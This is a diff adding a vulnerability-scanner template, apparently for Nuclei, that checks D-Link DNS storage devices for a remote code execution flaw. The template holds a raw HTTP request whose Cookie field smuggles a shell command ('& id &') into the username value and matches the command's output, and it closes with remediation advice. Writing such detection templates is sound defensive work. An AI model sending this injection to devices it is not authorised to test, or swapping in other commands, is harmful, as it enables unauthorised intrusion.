@@ -1,0 +1,35 @@
+id: dlink-dns-rce
+
+info:
+  name: D-Link DNS Remote Code Execution
+  author: adeljck
+  severity: critical
+  description: |
+    This template checks for remote code execution vulnerability in D-Link DNS devices.
+  remediation: |
+    To remediate this vulnerability, ensure that the device firmware is updated to the latest version provided by the manufacturer. Additionally, consider implementing network segmentation and firewall rules to restrict unauthorized access to the device.
+
+variables:
+  random_str: "{{randstr}}"
+
+http:
+  - raw:
+      - |
+        GET /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Cookie: username={{random_str}}'& id & echo '{{random_str}};
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "(?m){{random_str}}.*uid=\\d+.*gid=\\d+"
+      - type: word
+        words:
+          - "{{random_str}}"
